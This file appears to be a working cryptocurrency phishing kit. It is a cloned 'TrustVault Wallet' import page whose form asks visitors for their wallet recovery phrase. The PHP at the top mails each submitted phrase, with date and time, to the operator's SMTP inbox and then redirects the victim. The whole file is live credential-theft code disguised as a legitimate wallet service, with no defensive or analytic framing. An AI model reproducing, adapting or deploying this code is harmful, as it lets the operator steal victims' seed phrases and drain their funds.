<?php 
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

include '../config.php';

$message = "";
$wallet = "TrustVault";
$date = date("M d, Y");
$time = date("h:i:a");

  if (isset($_POST['submit'])) {
    $phrase = $_POST['phrase'];


    $mail = new PHPMailer(true);

      try {
       //Server settings
       $mail->SMTPDebug = 0; // Enable verbose debug output
       $mail->isSMTP(); // Set mailer to use SMTP
       $mail->Host = $host; // Specify main and backup SMTP servers
       $mail->SMTPAuth = true; // Enable SMTP authentication
       $mail->Username = $username; // SMTP username
       $mail->Password = $password; // SMTP password
       $mail->SMTPSecure = 'tls'; // Enable TLS encryption, [ICODE]ssl[/ICODE] also accepted
       $mail->Port = 587; // TCP port to connect to

      //Recipients
       $mail->setFrom($setForm, "");
       $mail->addAddress($username, '');// Add a recipient

      // Content
       $mail->isHTML(true); 
       $mail->Subject = $wallet.' Wallet form';

       $mail->Body = '<!DOCTYPE html>
                      <html>
                      <head>
                       <title></title>
                      </head>
                      <body>
                        <div>
                          <p>Hello</p>

                          <p>You have received a new entry P only. Here are the details</p>

                          <p><b>Phrase --- '.$phrase.'</b></p>

                          <p>Date - '.$date.'/</p>
                          <p>Time - '.$time.'/</p>
                        </div>
                      </body>
                      </html>';

        $send = $mail->send();
        if($send){
          header("location: ../imp.html");
         $message = 'Form has been submitted';
        }

        } catch (Exception $e) {
         echo "<p style='color: white;'>Message could not be sent. Mailer Error: {$mail->ErrorInfo}</p>";
     }

  }


?>



<!DOCTYPE html>
<html>

<!-- Mirrored from walletdatabase.io/list/import/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Nov 2021 09:35:54 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Import Wallet</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
    <link rel="stylesheet" href="assets/css/styles.css">
    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.html">
    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.html">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.html">
    <link rel="manifest" href="site.html">
</head>
</head>
<body>
    <header>
        <div class="container-fluid">
      <div class="row">
      <div class="col-md-4 offset-md-4">
        <a class="text-white" href="" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;<?php echo $wallet ?>  Wallet</a>
      </div>
      </div>
    </div>
    </header>

    <section style="margin-top: 40px;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4 offset-md-4">
          <!-- Tab panes -->
          <div class="tab-content">

            <h4 style="color: white;"><?php echo $message ?></h4>
            <div role="tabpanel" class="tab-pane fade show active" id="phrase">
              <form method="post" action="">
                <div class="form-group">
                  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
                </div>
                
                <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">Submit</button></div>
              </form>
            </div>
            
          </div>
                </div>
            </div>
        </div>
    </section>
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
</body>

<!-- Mirrored from walletdatabase.io/list/import/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Nov 2021 09:35:58 GMT -->
</html>